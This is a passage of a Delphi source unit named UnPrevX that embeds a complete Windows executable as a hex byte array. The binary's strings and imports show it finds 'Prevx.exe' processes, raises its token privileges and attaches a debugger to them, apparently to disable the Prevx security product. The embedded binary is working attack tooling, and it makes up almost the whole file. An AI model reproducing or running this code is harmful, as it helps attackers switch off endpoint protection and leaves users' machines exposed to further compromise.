{$E EXE}
{$IMAGEBASE $00410000}
{$R-}
{$Q-}
{$IFDEF minimum}
program UnPrevx;
{$ENDIF}
unit UnPrevx;
interface

uses
  Windows,
  WinNative,
  RTL,
  LDasm;

implementation

{$R version.res}

var
  tmp2: LBuf;

const
  hinst = $00410000;
  Title: PWideChar = 'UnPrevX 1.0.187 (05.08.2010)';

  data: array[0..5119] of byte = (
    $4D, $5A, $50, $00, $02, $00, $00, $00, $04, $00, $0F, $00, $FF, $FF, $00, $00,
    $B8, $00, $00, $00, $00, $00, $00, $00, $40, $00, $1A, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $01, $00, $00,
    $BA, $10, $00, $0E, $1F, $B4, $09, $CD, $21, $B8, $01, $4C, $CD, $21, $90, $90,
    $54, $68, $69, $73, $20, $70, $72, $6F, $67, $72, $61, $6D, $20, $6D, $75, $73,
    $74, $20, $62, $65, $20, $72, $75, $6E, $20, $75, $6E, $64, $65, $72, $20, $57,
    $69, $6E, $33, $32, $0D, $0A, $24, $37, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $50, $45, $00, $00, $4C, $01, $06, $00, $19, $5E, $42, $2A, $00, $00, $00, $00,
    $00, $00, $00, $00, $E0, $00, $8E, $A1, $0B, $01, $02, $19, $00, $06, $00, $00,
    $00, $0A, $00, $00, $00, $00, $00, $00, $50, $15, $00, $00, $00, $10, $00, $00,
    $00, $20, $00, $00, $00, $00, $40, $00, $00, $10, $00, $00, $00, $02, $00, $00,
    $01, $00, $00, $00, $00, $00, $00, $00, $04, $00, $00, $00, $00, $00, $00, $00,
    $00, $70, $00, $00, $00, $04, $00, $00, $00, $00, $00, $00, $02, $00, $00, $00,
    $00, $00, $10, $00, $00, $40, $00, $00, $00, $00, $10, $00, $00, $10, $00, $00,
    $00, $00, $00, $00, $10, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $40, $00, $00, $06, $02, $00, $00, $00, $60, $00, $00, $00, $02, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $50, $00, $00, $78, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $43, $4F, $44, $45, $00, $00, $00, $00,
    $68, $05, $00, $00, $00, $10, $00, $00, $00, $06, $00, $00, $00, $04, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $20, $00, $00, $60,
    $44, $41, $54, $41, $00, $00, $00, $00, $10, $00, $00, $00, $00, $20, $00, $00,
    $00, $02, $00, $00, $00, $0A, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $C0, $42, $53, $53, $00, $00, $00, $00, $00,
    $E5, $02, $00, $00, $00, $30, $00, $00, $00, $00, $00, $00, $00, $0C, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $C0,
    $2E, $69, $64, $61, $74, $61, $00, $00, $06, $02, $00, $00, $00, $40, $00, $00,
    $00, $04, $00, $00, $00, $0C, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $C0, $2E, $72, $65, $6C, $6F, $63, $00, $00,
    $78, $00, $00, $00, $00, $50, $00, $00, $00, $02, $00, $00, $00, $10, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $50,
    $2E, $72, $73, $72, $63, $00, $00, $00, $00, $02, $00, $00, $00, $60, $00, $00,
    $00, $02, $00, $00, $00, $12, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $50, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $70, $00, $00, $00, $00, $00, $00, $00, $14, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $50,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $FF, $25, $48, $40, $40, $00, $8B, $C0, $FF, $25, $44, $40, $40, $00, $8B, $C0,
    $FF, $25, $40, $40, $40, $00, $8B, $C0, $FF, $25, $3C, $40, $40, $00, $8B, $C0,
    $66, $83, $F8, $61, $7C, $0A, $66, $83, $F8, $7A, $7F, $04, $66, $25, $DF, $00,
    $C3, $8D, $40, $00, $53, $56, $57, $55, $51, $89, $14, $24, $8B, $E8, $33, $FF,
    $33, $F6, $66, $8B, $44, $75, $00, $E8, $D4, $FF, $FF, $FF, $8B, $D8, $8B, $04,
    $24, $66, $8B, $04, $70, $E8, $C6, $FF, $FF, $FF, $66, $3B, $C3, $73, $07, $BF,
    $01, $00, $00, $00, $EB, $08, $66, $3B, $C3, $76, $03, $83, $CF, $FF, $66, $85,
    $D8, $74, $05, $46, $85, $FF, $74, $CA, $8B, $C7, $5A, $5D, $5F, $5E, $5B, $C3,
    $57, $89, $C7, $89, $D1, $C1, $E9, $02, $31, $C0, $F2, $AB, $89, $D1, $83, $E1,
    $03, $F2, $AA, $5F, $C3, $8D, $40, $00, $FF, $25, $80, $40, $40, $00, $8B, $C0,
    $FF, $25, $7C, $40, $40, $00, $8B, $C0, $FF, $25, $78, $40, $40, $00, $8B, $C0,
    $FF, $25, $74, $40, $40, $00, $8B, $C0, $FF, $25, $70, $40, $40, $00, $8B, $C0,
    $FF, $25, $6C, $40, $40, $00, $8B, $C0, $FF, $25, $68, $40, $40, $00, $8B, $C0,
    $FF, $25, $64, $40, $40, $00, $8B, $C0, $FF, $25, $60, $40, $40, $00, $8B, $C0,
    $FF, $25, $5C, $40, $40, $00, $8B, $C0, $FF, $25, $58, $40, $40, $00, $8B, $C0,
    $FF, $25, $54, $40, $40, $00, $8B, $C0, $FF, $25, $50, $40, $40, $00, $8B, $C0,
    $55, $8B, $EC, $53, $C7, $00, $18, $00, $00, $00, $8B, $5D, $10, $89, $58, $04,
    $89, $50, $08, $89, $48, $0C, $8B, $55, $0C, $89, $50, $10, $8B, $55, $08, $89,
    $50, $14, $5B, $5D, $C2, $0C, $00, $90, $55, $8B, $EC, $83, $C4, $CC, $53, $80,
    $7D, $10, $00, $74, $13, $8D, $45, $FC, $50, $6A, $00, $6A, $28, $6A, $FE, $E8,
    $84, $FF, $FF, $FF, $8B, $D8, $EB, $0F, $8D, $45, $FC, $50, $6A, $28, $6A, $FF,
    $E8, $8B, $FF, $FF, $FF, $8B, $D8, $85, $DB, $74, $04, $8B, $C3, $EB, $65, $8B,
    $45, $08, $33, $D2, $89, $45, $F0, $89, $55, $F4, $C7, $45, $DC, $01, $00, $00,
    $00, $8B, $45, $F0, $89, $45, $E0, $8B, $45, $F4, $89, $45, $E4, $80, $7D, $0C,
    $00, $74, $09, $C7, $45, $E8, $02, $00, $00, $00, $EB, $05, $33, $C0, $89, $45,
    $E8, $8D, $45, $EC, $50, $8D, $45, $CC, $50, $6A, $10, $8D, $45, $DC, $50, $6A,
    $00, $8B, $45, $FC, $50, $E8, $3E, $FF, $FF, $FF, $8B, $D8, $8B, $45, $FC, $50,
    $E8, $0B, $FF, $FF, $FF, $81, $FB, $06, $01, $00, $00, $75, $05, $BB, $61, $00,
    $00, $C0, $8B, $C3, $5B, $8B, $E5, $5D, $C2, $0C, $00, $90, $64, $8B, $05, $18,
    $00, $00, $00, $8B, $40, $20, $C3, $90, $5C, $00, $42, $00, $61, $00, $73, $00,
    $65, $00, $4E, $00, $61, $00, $6D, $00, $65, $00, $64, $00, $4F, $00, $62, $00,
    $6A, $00, $65, $00, $63, $00, $74, $00, $73, $00, $5C, $00, $55, $00, $6E, $00,
    $50, $00, $72, $00, $65, $00, $76, $00, $78, $00, $4D, $00, $65, $00, $48, $00,
    $61, $00, $72, $00, $64, $00, $65, $00, $72, $00, $00, $00, $50, $00, $72, $00,
    $65, $00, $76, $00, $78, $00, $2E, $00, $65, $00, $78, $00, $65, $00, $00, $00,
    $00, $00, $00, $00, $53, $56, $57, $55, $83, $C4, $DC, $BD, $98, $30, $40, $00,
    $33, $DB, $33, $C0, $A3, $0C, $20, $40, $00, $B8, $88, $30, $40, $00, $BA, $08,
    $00, $00, $00, $E8, $28, $FE, $FF, $FF, $B8, $08, $30, $40, $00, $BA, $80, $00,
    $00, $00, $E8, $19, $FE, $FF, $FF, $33, $FF, $C7, $45, $00, $2C, $02, $00, $00,
    $6A, $00, $6A, $02, $E8, $87, $FD, $FF, $FF, $A3, $90, $30, $40, $00, $83, $3D,
    $90, $30, $40, $00, $FF, $0F, $84, $69, $01, $00, $00, $55, $A1, $90, $30, $40,
    $00, $50, $E8, $71, $FD, $FF, $FF, $85, $C0, $74, $39, $BE, $01, $00, $00, $00,
    $BB, $04, $20, $40, $00, $8D, $45, $24, $8B, $13, $E8, $85, $FD, $FF, $FF, $85,
    $C0, $75, $0B, $8B, $45, $08, $89, $04, $BD, $88, $30, $40, $00, $47, $83, $C3,
    $04, $4E, $75, $E1, $55, $A1, $90, $30, $40, $00, $50, $E8, $40, $FD, $FF, $FF,
    $85, $C0, $75, $C7, $A1, $90, $30, $40, $00, $50, $E8, $39, $FD, $FF, $FF, $C7,
    $44, $24, $04, $00, $00, $40, $00, $33, $C0, $89, $44, $24, $08, $6A, $04, $68,
    $00, $10, $00, $00, $8D, $44, $24, $0C, $50, $6A, $00, $8D, $44, $24, $18, $50,
    $6A, $FF, $E8, $C9, $FD, $FF, $FF, $83, $7C, $24, $08, $00, $0F, $84, $D8, $00,
    $00, $00, $8D, $44, $24, $04, $50, $68, $00, $00, $40, $00, $8B, $44, $24, $10,
    $50, $6A, $10, $E8, $90, $FD, $FF, $FF, $8B, $44, $24, $08, $8B, $38, $4F, $85,
    $FF, $0F, $8C, $97, $00, $00, $00, $47, $33, $DB, $E8, $8D, $FE, $FF, $FF, $8B,
    $F3, $03, $F6, $8B, $54, $24, $08, $3B, $44, $F2, $04, $75, $79, $8B, $44, $24,
    $08, $80, $7C, $F0, $08, $05, $75, $6E, $8B, $44, $24, $08, $0F, $B7, $6C, $F0,
    $0A, $A1, $0C, $20, $40, $00, $89, $2C, $85, $08, $30, $40, $00, $C6, $04, $24,
    $00, $8D, $44, $24, $04, $50, $6A, $18, $8D, $44, $24, $14, $50, $6A, $00, $A1,
    $0C, $20, $40, $00, $55, $E8, $26, $FD, $FF, $FF, $85, $C0, $75, $24, $BE, $02,
    $00, $00, $00, $B8, $88, $30, $40, $00, $8B, $10, $3B, $54, $24, $1C, $75, $0C,
    $C6, $04, $24, $01, $FF, $05, $0C, $20, $40, $00, $EB, $06, $83, $C0, $04, $4E,
    $75, $E6, $80, $3C, $24, $00, $75, $0E, $A1, $0C, $20, $40, $00, $33, $D2, $89,
    $14, $85, $08, $30, $40, $00, $43, $4F, $0F, $85, $6C, $FF, $FF, $FF, $33, $C0,
    $89, $44, $24, $04, $68, $00, $80, $00, $00, $8D, $44, $24, $08, $50, $8D, $44,
    $24, $10, $50, $6A, $FF, $E8, $EE, $FC, $FF, $FF, $83, $3D, $0C, $20, $40, $00,
    $00, $0F, $9F, $C3, $8B, $C3, $83, $C4, $24, $5D, $5F, $5E, $5B, $C3, $8B, $C0,
    $53, $56, $57, $55, $83, $C4, $F8, $8D, $6C, $24, $04, $E8, $E8, $FC, $FF, $FF,
    $85, $C0, $0F, $85, $B2, $00, $00, $00, $8B, $35, $0C, $20, $40, $00, $4E, $85,
    $F6, $7C, $20, $46, $BB, $08, $30, $40, $00, $8B, $03, $50, $E8, $BF, $FC, $FF,
    $FF, $85, $C0, $75, $08, $8B, $03, $50, $E8, $83, $FC, $FF, $FF, $83, $C3, $04,
    $4E, $75, $E6, $C7, $04, $24, $00, $00, $40, $00, $33, $C0, $89, $45, $00, $6A,
    $04, $68, $00, $10, $00, $00, $8D, $44, $24, $08, $50, $6A, $00, $55, $6A, $FF,
    $E8, $6B, $FC, $FF, $FF, $54, $68, $00, $00, $40, $00, $8B, $45, $00, $50, $6A,
    $10, $E8, $42, $FC, $FF, $FF, $8B, $45, $00, $8B, $30, $4E, $85, $F6, $7C, $33,
    $46, $33, $DB, $E8, $44, $FD, $FF, $FF, $8B, $FB, $03, $FF, $8B, $55, $00, $3B,
    $44, $FA, $04, $75, $1A, $8B, $45, $00, $80, $7C, $F8, $08, $08, $75, $10, $8B,
    $45, $00, $0F, $B7, $44, $F8, $0A, $50, $E8, $13, $FC, $FF, $FF, $EB, $04, $43,
    $4E, $75, $D0, $33, $C0, $89, $04, $24, $68, $00, $80, $00, $00, $8D, $44, $24,
    $04, $50, $55, $6A, $FF, $E8, $0E, $FC, $FF, $FF, $59, $5A, $5D, $5F, $5E, $5B,
    $C3, $8D, $40, $00, $33, $C0, $A3, $94, $30, $40, $00, $6A, $00, $6A, $01, $6A,
    $14, $E8, $42, $FC, $FF, $FF, $A1, $00, $20, $40, $00, $50, $68, $DC, $32, $40,
    $00, $E8, $B2, $FB, $FF, $FF, $6A, $00, $6A, $00, $6A, $00, $BA, $DC, $32, $40,
    $00, $B8, $C4, $32, $40, $00, $B9, $40, $00, $00, $00, $E8, $F0, $FB, $FF, $FF,
    $68, $C4, $32, $40, $00, $68, $03, $00, $1F, $00, $68, $94, $30, $40, $00, $E8,
    $74, $FB, $FF, $FF, $85, $C0, $75, $26, $E8, $07, $FD, $FF, $FF, $84, $C0, $74,
    $05, $E8, $CA, $FE, $FF, $FF, $6A, $00, $A1, $94, $30, $40, $00, $50, $E8, $5D,
    $FB, $FF, $FF, $A1, $94, $30, $40, $00, $50, $E8, $72, $FB, $FF, $FF, $C3, $90,
    $83, $2D, $04, $30, $40, $00, $01, $73, $0B, $E8, $76, $FF, $FF, $FF, $31, $C0,
    $40, $C2, $0C, $00, $C3, $8D, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $D8, $11, $40, $00, $1C, $12, $40, $00, $30, $12, $40, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $88, $40, $00, $00,
    $3C, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $E4, $40, $00, $00, $50, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $96, $40, $00, $00,
    $A4, $40, $00, $00, $B6, $40, $00, $00, $C8, $40, $00, $00, $00, $00, $00, $00,
    $EE, $40, $00, $00, $02, $41, $00, $00, $1C, $41, $00, $00, $36, $41, $00, $00,
    $4C, $41, $00, $00, $62, $41, $00, $00, $7C, $41, $00, $00, $90, $41, $00, $00,
    $9A, $41, $00, $00, $B6, $41, $00, $00, $D2, $41, $00, $00, $EA, $41, $00, $00,
    $F8, $41, $00, $00, $00, $00, $00, $00, $6B, $65, $72, $6E, $65, $6C, $33, $32,
    $2E, $64, $6C, $6C, $00, $00, $00, $00, $43, $6C, $6F, $73, $65, $48, $61, $6E,
    $64, $6C, $65, $00, $00, $00, $50, $72, $6F, $63, $65, $73, $73, $33, $32, $4E,
    $65, $78, $74, $57, $00, $00, $00, $00, $50, $72, $6F, $63, $65, $73, $73, $33,
    $32, $46, $69, $72, $73, $74, $57, $00, $00, $00, $43, $72, $65, $61, $74, $65,
    $54, $6F, $6F, $6C, $68, $65, $6C, $70, $33, $32, $53, $6E, $61, $70, $73, $68,
    $6F, $74, $00, $00, $6E, $74, $64, $6C, $6C, $2E, $64, $6C, $6C, $00, $00, $00,
    $44, $62, $67, $55, $69, $43, $6F, $6E, $6E, $65, $63, $74, $54, $6F, $44, $62,
    $67, $00, $00, $00, $44, $62, $67, $55, $69, $44, $65, $62, $75, $67, $41, $63,
    $74, $69, $76, $65, $50, $72, $6F, $63, $65, $73, $73, $00, $00, $00, $5A, $77,
    $41, $64, $6A, $75, $73, $74, $50, $72, $69, $76, $69, $6C, $65, $67, $65, $73,
    $54, $6F, $6B, $65, $6E, $00, $00, $00, $5A, $77, $4F, $70, $65, $6E, $50, $72,
    $6F, $63, $65, $73, $73, $54, $6F, $6B, $65, $6E, $00, $00, $00, $00, $5A, $77,
    $46, $72, $65, $65, $56, $69, $72, $74, $75, $61, $6C, $4D, $65, $6D, $6F, $72,
    $79, $00, $00, $00, $5A, $77, $41, $6C, $6C, $6F, $63, $61, $74, $65, $56, $69,
    $72, $74, $75, $61, $6C, $4D, $65, $6D, $6F, $72, $79, $00, $00, $00, $5A, $77,
    $4F, $70, $65, $6E, $54, $68, $72, $65, $61, $64, $54, $6F, $6B, $65, $6E, $00,
    $00, $00, $5A, $77, $43, $6C, $6F, $73, $65, $00, $00, $00, $5A, $77, $51, $75,
    $65, $72, $79, $53, $79, $73, $74, $65, $6D, $49, $6E, $66, $6F, $72, $6D, $61,
    $74, $69, $6F, $6E, $00, $00, $00, $00, $5A, $77, $51, $75, $65, $72, $79, $49,
    $6E, $66, $6F, $72, $6D, $61, $74, $69, $6F, $6E, $50, $72, $6F, $63, $65, $73,
    $73, $00, $00, $00, $52, $74, $6C, $49, $6E, $69, $74, $55, $6E, $69, $63, $6F,
    $64, $65, $53, $74, $72, $69, $6E, $67, $00, $00, $00, $00, $5A, $77, $53, $65,
    $74, $45, $76, $65, $6E, $74, $00, $00, $00, $00, $5A, $77, $4F, $70, $65, $6E,
    $45, $76, $65, $6E, $74, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $10, $00, $00, $68, $00, $00, $00, $02, $30, $0A, $30, $12, $30, $1A, $30,
    $9A, $30, $A2, $30, $AA, $30, $B2, $30, $BA, $30, $C2, $30, $CA, $30, $D2, $30,
    $DA, $30, $E2, $30, $EA, $30, $F2, $30, $FA, $30, $3C, $32, $45, $32, $4A, $32,
    $59, $32, $7A, $32, $80, $32, $8D, $32, $A1, $32, $B9, $32, $C6, $32, $D5, $32,
    $62, $33, $69, $33, $80, $33, $94, $33, $A6, $33, $B9, $33, $C2, $33, $EC, $33,
    $1A, $34, $25, $34, $D7, $34, $E7, $34, $ED, $34, $FD, $34, $02, $35, $11, $35,
    $1B, $35, $39, $35, $44, $35, $52, $35, $00, $20, $00, $00, $10, $00, $00, $00,
    $00, $30, $04, $30, $08, $30, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
